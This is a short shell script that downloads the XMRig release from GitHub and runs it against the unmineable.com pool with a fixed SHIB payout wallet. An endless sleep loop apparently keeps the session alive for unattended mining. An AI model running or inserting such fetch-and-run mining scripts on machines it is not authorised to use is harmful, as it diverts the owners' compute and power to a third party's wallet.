#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar -xf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o rx.unmineable.com:3333 -u SHIB:0xA3162F7204bCF8784246936659C6B7B3D0636d38.shib2 -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
